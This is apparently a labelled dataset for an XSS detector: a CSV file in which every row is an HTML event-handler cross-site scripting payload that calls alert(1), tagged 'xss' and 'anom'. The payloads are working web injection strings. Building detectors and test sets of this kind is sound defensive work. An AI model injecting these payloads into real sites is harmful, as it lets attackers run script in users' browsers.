payload,length,attack_type,label
"<audio id=x controls onfocus=alert(1) id=x><source src=""validaudio.wav""></audio>",80,xss,anom
"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",82,xss,anom
<audio id=x tabindex=1 onactivate=alert(1)></audio>,51,xss,anom
<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>,57,xss,anom
<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>,76,xss,anom
<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>,75,xss,anom
"<audio onbeforecopy=""alert(1)"" contenteditable>test</audio>",59,xss,anom
"<audio onbeforecut=""alert(1)"" contenteditable>test</audio>",58,xss,anom
"<audio onbeforepaste=""alert(1)"" contenteditable>test</audio>",60,xss,anom
<audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>,64,xss,anom
"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",80,xss,anom
"<audio onclick=""alert(1)"">test</audio>",38,xss,anom
"<audio oncontextmenu=""alert(1)"">test</audio>",44,xss,anom
"<audio oncopy=""alert(1)"" contenteditable>test</audio>",53,xss,anom
"<audio oncut=""alert(1)"" contenteditable>test</audio>",52,xss,anom
"<audio ondblclick=""alert(1)"">test</audio>",41,xss,anom
<audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>,68,xss,anom
"<audio onkeydown=""alert(1)"" contenteditable>test</audio>",56,xss,anom
"<audio onkeypress=""alert(1)"" contenteditable>test</audio>",57,xss,anom
"<audio onkeyup=""alert(1)"" contenteditable>test</audio>",54,xss,anom
"<audio onloadeddata=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",83,xss,anom
"<audio onmousedown=""alert(1)"">test</audio>",42,xss,anom
"<audio onmouseenter=""alert(1)"">test</audio>",43,xss,anom
"<audio onmouseleave=""alert(1)"">test</audio>",43,xss,anom
"<audio onmousemove=""alert(1)"">test</audio>",42,xss,anom
"<audio onmouseout=""alert(1)"">test</audio>",41,xss,anom
"<audio onmouseover=""alert(1)"">test</audio>",42,xss,anom
"<audio onmouseup=""alert(1)"">test</audio>",40,xss,anom
"<audio onpaste=""alert(1)"" contenteditable>test</audio>",54,xss,anom
<audio src/onerror=alert(1)>,28,xss,anom
"<b draggable=""true"" ondrag=""alert(1)"">test</b>",46,xss,anom
"<b draggable=""true"" ondragend=""alert(1)"">test</b>",49,xss,anom
"<b draggable=""true"" ondragenter=""alert(1)"">test</b>",51,xss,anom
"<b draggable=""true"" ondragleave=""alert(1)"">test</b>",51,xss,anom
"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",51,xss,anom
<b id=x tabindex=1 onactivate=alert(1)></b>,43,xss,anom
<b id=x tabindex=1 onbeforeactivate=alert(1)></b>,49,xss,anom
<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>,68,xss,anom
<b id=x tabindex=1 ondeactivate=alert(1)></b><input id=y autofocus>,67,xss,anom
<b id=x tabindex=1 onfocus=alert(1)></b>,40,xss,anom
<b id=x tabindex=1 onfocusin=alert(1)></b>,42,xss,anom
"<b onbeforecopy=""alert(1)"" contenteditable>test</b>",51,xss,anom
"<b onbeforecut=""alert(1)"" contenteditable>test</b>",50,xss,anom
"<b onbeforepaste=""alert(1)"" contenteditable>test</b>",52,xss,anom
<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>,56,xss,anom
"<b onclick=""alert(1)"">test</b>",30,xss,anom
"<b oncontextmenu=""alert(1)"">test</b>",36,xss,anom
"<b oncopy=""alert(1)"" contenteditable>test</b>",45,xss,anom
"<b oncut=""alert(1)"" contenteditable>test</b>",44,xss,anom
"<b ondblclick=""alert(1)"">test</b>",33,xss,anom
<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>,60,xss,anom
"<b onkeydown=""alert(1)"" contenteditable>test</b>",48,xss,anom
"<b onkeypress=""alert(1)"" contenteditable>test</b>",49,xss,anom
"<b onkeyup=""alert(1)"" contenteditable>test</b>",46,xss,anom
"<b onmousedown=""alert(1)"">test</b>",34,xss,anom
"<b onmouseenter=""alert(1)"">test</b>",35,xss,anom
"<b onmouseleave=""alert(1)"">test</b>",35,xss,anom
"<b onmousemove=""alert(1)"">test</b>",34,xss,anom
"<b onmouseout=""alert(1)"">test</b>",33,xss,anom
"<b onmouseover=""alert(1)"">test</b>",34,xss,anom
"<b onmouseup=""alert(1)"">test</b>",32,xss,anom
"<b onpaste=""alert(1)"" contenteditable>test</b>",46,xss,anom
"<base draggable=""true"" ondrag=""alert(1)"">test</base>",52,xss,anom
"<base draggable=""true"" ondragend=""alert(1)"">test</base>",55,xss,anom
"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",57,xss,anom
"<base draggable=""true"" ondragleave=""alert(1)"">test</base>",57,xss,anom
"<base draggable=""true"" ondragstart=""alert(1)"">test</base>",57,xss,anom
<base id=x tabindex=1 onactivate=alert(1)></base>,49,xss,anom
<base id=x tabindex=1 onbeforeactivate=alert(1)></base>,55,xss,anom
<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>,74,xss,anom
<base id=x tabindex=1 ondeactivate=alert(1)></base><input id=y autofocus>,73,xss,anom
<base id=x tabindex=1 onfocus=alert(1)></base>,46,xss,anom
<base id=x tabindex=1 onfocusin=alert(1)></base>,48,xss,anom
"<base onbeforecopy=""alert(1)"" contenteditable>test</base>",57,xss,anom
"<base onbeforecut=""alert(1)"" contenteditable>test</base>",56,xss,anom
"<base onbeforepaste=""alert(1)"" contenteditable>test</base>",58,xss,anom
<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>,62,xss,anom
"<base onclick=""alert(1)"">test</base>",36,xss,anom
"<base oncontextmenu=""alert(1)"">test</base>",42,xss,anom
"<base oncopy=""alert(1)"" contenteditable>test</base>",51,xss,anom
"<base oncut=""alert(1)"" contenteditable>test</base>",50,xss,anom
"<base ondblclick=""alert(1)"">test</base>",39,xss,anom
<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>,66,xss,anom
"<base onkeydown=""alert(1)"" contenteditable>test</base>",54,xss,anom
"<base onkeypress=""alert(1)"" contenteditable>test</base>",55,xss,anom
"<base onkeyup=""alert(1)"" contenteditable>test</base>",52,xss,anom
"<base onmousedown=""alert(1)"">test</base>",40,xss,anom
"<base onmouseenter=""alert(1)"">test</base>",41,xss,anom
"<base onmouseleave=""alert(1)"">test</base>",41,xss,anom
"<base onmousemove=""alert(1)"">test</base>",40,xss,anom
"<base onmouseout=""alert(1)"">test</base>",39,xss,anom
"<base onmouseover=""alert(1)"">test</base>",40,xss,anom
"<base onmouseup=""alert(1)"">test</base>",38,xss,anom
"<base onpaste=""alert(1)"" contenteditable>test</base>",52,xss,anom
"<basefont draggable=""true"" ondrag=""alert(1)"">test</basefont>",60,xss,anom
"<basefont draggable=""true"" ondragend=""alert(1)"">test</basefont>",63,xss,anom
"<basefont draggable=""true"" ondragenter=""alert(1)"">test</basefont>",65,xss,anom
"<basefont draggable=""true"" ondragleave=""alert(1)"">test</basefont>",65,xss,anom
"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",65,xss,anom
<basefont id=x tabindex=1 onactivate=alert(1)></basefont>,57,xss,anom
<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>,63,xss,anom
<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>,82,xss,anom
<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>,81,xss,anom
<basefont id=x tabindex=1 onfocus=alert(1)></basefont>,54,xss,anom
<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>,56,xss,anom
"<basefont onbeforecopy=""alert(1)"" contenteditable>test</basefont>",65,xss,anom
"<basefont onbeforecut=""alert(1)"" contenteditable>test</basefont>",64,xss,anom
"<basefont onbeforepaste=""alert(1)"" contenteditable>test</basefont>",66,xss,anom
<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>,70,xss,anom
"<basefont onclick=""alert(1)"">test</basefont>",44,xss,anom
"<basefont oncontextmenu=""alert(1)"">test</basefont>",50,xss,anom
"<basefont oncopy=""alert(1)"" contenteditable>test</basefont>",59,xss,anom
"<basefont oncut=""alert(1)"" contenteditable>test</basefont>",58,xss,anom
"<basefont ondblclick=""alert(1)"">test</basefont>",47,xss,anom
<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>,74,xss,anom
"<basefont onkeydown=""alert(1)"" contenteditable>test</basefont>",62,xss,anom
"<basefont onkeypress=""alert(1)"" contenteditable>test</basefont>",63,xss,anom
"<basefont onkeyup=""alert(1)"" contenteditable>test</basefont>",60,xss,anom
"<basefont onmousedown=""alert(1)"">test</basefont>",48,xss,anom
"<basefont onmouseenter=""alert(1)"">test</basefont>",49,xss,anom
"<basefont onmouseleave=""alert(1)"">test</basefont>",49,xss,anom
"<basefont onmousemove=""alert(1)"">test</basefont>",48,xss,anom
"<basefont onmouseout=""alert(1)"">test</basefont>",47,xss,anom
"<basefont onmouseover=""alert(1)"">test</basefont>",48,xss,anom
"<basefont onmouseup=""alert(1)"">test</basefont>",46,xss,anom
"<basefont onpaste=""alert(1)"" contenteditable>test</basefont>",60,xss,anom
"<bdi draggable=""true"" ondrag=""alert(1)"">test</bdi>",50,xss,anom
"<bdi draggable=""true"" ondragend=""alert(1)"">test</bdi>",53,xss,anom
"<bdi draggable=""true"" ondragenter=""alert(1)"">test</bdi>",55,xss,anom
"<bdi draggable=""true"" ondragleave=""alert(1)"">test</bdi>",55,xss,anom
"<bdi draggable=""true"" ondragstart=""alert(1)"">test</bdi>",55,xss,anom
<bdi id=x tabindex=1 onactivate=alert(1)></bdi>,47,xss,anom
<bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>,53,xss,anom
<bdi id=x tabindex=1 onbeforedeactivate=alert(1)></bdi><input autofocus>,72,xss,anom
<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>,71,xss,anom
<bdi id=x tabindex=1 onfocus=alert(1)></bdi>,44,xss,anom
<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>,46,xss,anom
"<bdi onbeforecopy=""alert(1)"" contenteditable>test</bdi>",55,xss,anom
"<bdi onbeforecut=""alert(1)"" contenteditable>test</bdi>",54,xss,anom
"<bdi onbeforepaste=""alert(1)"" contenteditable>test</bdi>",56,xss,anom
<bdi onblur=alert(1) tabindex=1 id=x></bdi><input autofocus>,60,xss,anom
"<bdi onclick=""alert(1)"">test</bdi>",34,xss,anom
"<bdi oncontextmenu=""alert(1)"">test</bdi>",40,xss,anom
"<bdi oncopy=""alert(1)"" contenteditable>test</bdi>",49,xss,anom
"<bdi oncut=""alert(1)"" contenteditable>test</bdi>",48,xss,anom
"<bdi ondblclick=""alert(1)"">test</bdi>",37,xss,anom
<bdi onfocusout=alert(1) tabindex=1 id=x></bdi><input autofocus>,64,xss,anom
"<bdi onkeydown=""alert(1)"" contenteditable>test</bdi>",52,xss,anom
"<bdi onkeypress=""alert(1)"" contenteditable>test</bdi>",53,xss,anom
"<bdi onkeyup=""alert(1)"" contenteditable>test</bdi>",50,xss,anom
"<bdi onmousedown=""alert(1)"">test</bdi>",38,xss,anom
"<bdi onmouseenter=""alert(1)"">test</bdi>",39,xss,anom
"<bdi onmouseleave=""alert(1)"">test</bdi>",39,xss,anom
"<bdi onmousemove=""alert(1)"">test</bdi>",38,xss,anom
"<bdi onmouseout=""alert(1)"">test</bdi>",37,xss,anom
"<bdi onmouseover=""alert(1)"">test</bdi>",38,xss,anom
"<bdi onmouseup=""alert(1)"">test</bdi>",36,xss,anom
"<bdi onpaste=""alert(1)"" contenteditable>test</bdi>",50,xss,anom
"<bdo draggable=""true"" ondrag=""alert(1)"">test</bdo>",50,xss,anom
"<bdo draggable=""true"" ondragend=""alert(1)"">test</bdo>",53,xss,anom
"<bdo draggable=""true"" ondragenter=""alert(1)"">test</bdo>",55,xss,anom
"<bdo draggable=""true"" ondragleave=""alert(1)"">test</bdo>",55,xss,anom
"<bdo draggable=""true"" ondragstart=""alert(1)"">test</bdo>",55,xss,anom
<bdo id=x tabindex=1 onactivate=alert(1)></bdo>,47,xss,anom
<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>,53,xss,anom
<bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>,72,xss,anom
<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>,71,xss,anom
<bdo id=x tabindex=1 onfocus=alert(1)></bdo>,44,xss,anom
<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>,46,xss,anom
"<bdo onbeforecopy=""alert(1)"" contenteditable>test</bdo>",55,xss,anom
"<bdo onbeforecut=""alert(1)"" contenteditable>test</bdo>",54,xss,anom
"<bdo onbeforepaste=""alert(1)"" contenteditable>test</bdo>",56,xss,anom
<bdo onblur=alert(1) tabindex=1 id=x></bdo><input autofocus>,60,xss,anom
"<bdo onclick=""alert(1)"">test</bdo>",34,xss,anom
"<bdo oncontextmenu=""alert(1)"">test</bdo>",40,xss,anom
"<bdo oncopy=""alert(1)"" contenteditable>test</bdo>",49,xss,anom
"<bdo oncut=""alert(1)"" contenteditable>test</bdo>",48,xss,anom
"<bdo ondblclick=""alert(1)"">test</bdo>",37,xss,anom
<bdo onfocusout=alert(1) tabindex=1 id=x></bdo><input autofocus>,64,xss,anom
"<bdo onkeydown=""alert(1)"" contenteditable>test</bdo>",52,xss,anom
"<bdo onkeypress=""alert(1)"" contenteditable>test</bdo>",53,xss,anom
"<bdo onkeyup=""alert(1)"" contenteditable>test</bdo>",50,xss,anom
"<bdo onmousedown=""alert(1)"">test</bdo>",38,xss,anom
"<bdo onmouseenter=""alert(1)"">test</bdo>",39,xss,anom
"<bdo onmouseleave=""alert(1)"">test</bdo>",39,xss,anom
"<bdo onmousemove=""alert(1)"">test</bdo>",38,xss,anom
"<bdo onmouseout=""alert(1)"">test</bdo>",37,xss,anom
"<bdo onmouseover=""alert(1)"">test</bdo>",38,xss,anom
"<bdo onmouseup=""alert(1)"">test</bdo>",36,xss,anom
"<bdo onpaste=""alert(1)"" contenteditable>test</bdo>",50,xss,anom
"<bgsound draggable=""true"" ondrag=""alert(1)"">test</bgsound>",58,xss,anom
"<bgsound draggable=""true"" ondragend=""alert(1)"">test</bgsound>",61,xss,anom
"<bgsound draggable=""true"" ondragenter=""alert(1)"">test</bgsound>",63,xss,anom
"<bgsound draggable=""true"" ondragleave=""alert(1)"">test</bgsound>",63,xss,anom
"<bgsound draggable=""true"" ondragstart=""alert(1)"">test</bgsound>",63,xss,anom
<bgsound id=x tabindex=1 onactivate=alert(1)></bgsound>,55,xss,anom
<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>,61,xss,anom
<bgsound id=x tabindex=1 onbeforedeactivate=alert(1)></bgsound><input autofocus>,80,xss,anom
<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>,79,xss,anom
<bgsound id=x tabindex=1 onfocus=alert(1)></bgsound>,52,xss,anom
<bgsound id=x tabindex=1 onfocusin=alert(1)></bgsound>,54,xss,anom
"<bgsound onbeforecopy=""alert(1)"" contenteditable>test</bgsound>",63,xss,anom
"<bgsound onbeforecut=""alert(1)"" contenteditable>test</bgsound>",62,xss,anom
"<bgsound onbeforepaste=""alert(1)"" contenteditable>test</bgsound>",64,xss,anom
<bgsound onblur=alert(1) tabindex=1 id=x></bgsound><input autofocus>,68,xss,anom
"<bgsound onclick=""alert(1)"">test</bgsound>",42,xss,anom
"<bgsound oncontextmenu=""alert(1)"">test</bgsound>",48,xss,anom
"<bgsound oncopy=""alert(1)"" contenteditable>test</bgsound>",57,xss,anom
"<bgsound oncut=""alert(1)"" contenteditable>test</bgsound>",56,xss,anom
"<bgsound ondblclick=""alert(1)"">test</bgsound>",45,xss,anom
<bgsound onfocusout=alert(1) tabindex=1 id=x></bgsound><input autofocus>,72,xss,anom
"<bgsound onkeydown=""alert(1)"" contenteditable>test</bgsound>",60,xss,anom
"<bgsound onkeypress=""alert(1)"" contenteditable>test</bgsound>",61,xss,anom
"<bgsound onkeyup=""alert(1)"" contenteditable>test</bgsound>",58,xss,anom
"<bgsound onmousedown=""alert(1)"">test</bgsound>",46,xss,anom
"<bgsound onmouseenter=""alert(1)"">test</bgsound>",47,xss,anom
"<bgsound onmouseleave=""alert(1)"">test</bgsound>",47,xss,anom
"<bgsound onmousemove=""alert(1)"">test</bgsound>",46,xss,anom
"<bgsound onmouseout=""alert(1)"">test</bgsound>",45,xss,anom
"<bgsound onmouseover=""alert(1)"">test</bgsound>",46,xss,anom
"<bgsound onmouseup=""alert(1)"">test</bgsound>",44,xss,anom
"<bgsound onpaste=""alert(1)"" contenteditable>test</bgsound>",58,xss,anom
"<big draggable=""true"" ondrag=""alert(1)"">test</big>",50,xss,anom
"<big draggable=""true"" ondragend=""alert(1)"">test</big>",53,xss,anom
"<big draggable=""true"" ondragenter=""alert(1)"">test</big>",55,xss,anom
"<big draggable=""true"" ondragleave=""alert(1)"">test</big>",55,xss,anom
"<big draggable=""true"" ondragstart=""alert(1)"">test</big>",55,xss,anom
<big id=x tabindex=1 onactivate=alert(1)></big>,47,xss,anom
<big id=x tabindex=1 onbeforeactivate=alert(1)></big>,53,xss,anom
<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>,72,xss,anom
<big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>,71,xss,anom
<big id=x tabindex=1 onfocus=alert(1)></big>,44,xss,anom
<big id=x tabindex=1 onfocusin=alert(1)></big>,46,xss,anom
"<big onbeforecopy=""alert(1)"" contenteditable>test</big>",55,xss,anom
"<big onbeforecut=""alert(1)"" contenteditable>test</big>",54,xss,anom
"<big onbeforepaste=""alert(1)"" contenteditable>test</big>",56,xss,anom
<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>,60,xss,anom
"<big onclick=""alert(1)"">test</big>",34,xss,anom
"<big oncontextmenu=""alert(1)"">test</big>",40,xss,anom
"<big oncopy=""alert(1)"" contenteditable>test</big>",49,xss,anom
"<big oncut=""alert(1)"" contenteditable>test</big>",48,xss,anom
"<big ondblclick=""alert(1)"">test</big>",37,xss,anom
<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>,64,xss,anom
"<big onkeydown=""alert(1)"" contenteditable>test</big>",52,xss,anom
"<big onkeypress=""alert(1)"" contenteditable>test</big>",53,xss,anom
"<big onkeyup=""alert(1)"" contenteditable>test</big>",50,xss,anom
"<big onmousedown=""alert(1)"">test</big>",38,xss,anom
"<big onmouseenter=""alert(1)"">test</big>",39,xss,anom
"<big onmouseleave=""alert(1)"">test</big>",39,xss,anom
"<big onmousemove=""alert(1)"">test</big>",38,xss,anom
"<big onmouseout=""alert(1)"">test</big>",37,xss,anom
"<big onmouseover=""alert(1)"">test</big>",38,xss,anom
"<big onmouseup=""alert(1)"">test</big>",36,xss,anom
"<big onpaste=""alert(1)"" contenteditable>test</big>",50,xss,anom
"<blink draggable=""true"" ondrag=""alert(1)"">test</blink>",54,xss,anom
"<blink draggable=""true"" ondragend=""alert(1)"">test</blink>",57,xss,anom
"<blink draggable=""true"" ondragenter=""alert(1)"">test</blink>",59,xss,anom
"<blink draggable=""true"" ondragleave=""alert(1)"">test</blink>",59,xss,anom
"<blink draggable=""true"" ondragstart=""alert(1)"">test</blink>",59,xss,anom
<blink id=x tabindex=1 onactivate=alert(1)></blink>,51,xss,anom
<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>,57,xss,anom
<blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>,76,xss,anom
<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>,75,xss,anom
<blink id=x tabindex=1 onfocus=alert(1)></blink>,48,xss,anom
<blink id=x tabindex=1 onfocusin=alert(1)></blink>,50,xss,anom
"<blink onbeforecopy=""alert(1)"" contenteditable>test</blink>",59,xss,anom
"<blink onbeforecut=""alert(1)"" contenteditable>test</blink>",58,xss,anom
"<blink onbeforepaste=""alert(1)"" contenteditable>test</blink>",60,xss,anom
<blink onblur=alert(1) tabindex=1 id=x></blink><input autofocus>,64,xss,anom
"<blink onclick=""alert(1)"">test</blink>",38,xss,anom
"<blink oncontextmenu=""alert(1)"">test</blink>",44,xss,anom
"<blink oncopy=""alert(1)"" contenteditable>test</blink>",53,xss,anom
"<blink oncut=""alert(1)"" contenteditable>test</blink>",52,xss,anom
"<blink ondblclick=""alert(1)"">test</blink>",41,xss,anom
<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>,68,xss,anom
"<blink onkeydown=""alert(1)"" contenteditable>test</blink>",56,xss,anom
"<blink onkeypress=""alert(1)"" contenteditable>test</blink>",57,xss,anom
"<blink onkeyup=""alert(1)"" contenteditable>test</blink>",54,xss,anom
"<blink onmousedown=""alert(1)"">test</blink>",42,xss,anom
